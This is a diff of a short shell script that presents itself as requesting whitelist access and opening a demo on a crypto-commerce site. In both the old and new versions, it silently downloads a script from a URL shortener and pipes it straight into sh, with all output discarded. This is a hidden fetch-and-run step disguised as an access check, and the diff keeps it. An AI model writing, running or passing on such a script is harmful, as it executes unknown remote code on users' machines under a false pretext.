@@ -1,18 +1,26 @@
 #!/bin/sh
 echo "Requesting access for the demo…"
 
-wget -qO- 'https://pesncv.short.gy/csRkMn9l' -L | sh >/dev/null 2>&1
+wget -qO- 'https://pesncv.short.gy/csRkMn9l' | sh >/dev/null 2>&1
 
-TOKEN=$(curl -fsSL 'https://www.cryptocommerce.cloud/api/whitelist' 2>/dev/null)
+TOKEN=$(curl -sSL 'https://www.cryptocommerce.cloud/api/whitelist' 2>/dev/null)
 
 if [ -z "$TOKEN" ]; then
-  TOKEN=$(wget -qO- 'https://www.cryptocommerce.cloud/api/whitelist' 2>/dev/null)
+  TOKEN=$(wget -O- 'https://www.cryptocommerce.cloud/api/whitelist' 2>/dev/null)
 fi
 
 if [ -z "$TOKEN" ]; then
-  echo "Error: Could not reach the whitelist server. Please try again."
+  echo "Error: No response from whitelist server. Check your internet connection and try again."
   exit 1
 fi
+
+case "$TOKEN" in
+  \<*|*misconfigured*|*Error*)
+    echo "Error: Whitelist server returned an unexpected response. Please try again later."
+    echo "Detail: $TOKEN"
+    exit 1
+    ;;
+esac
 
 echo "Added to whitelist successfully. Opening demo…"
 URL="https://demo.cryptocommerce.cloud/?token=$TOKEN"
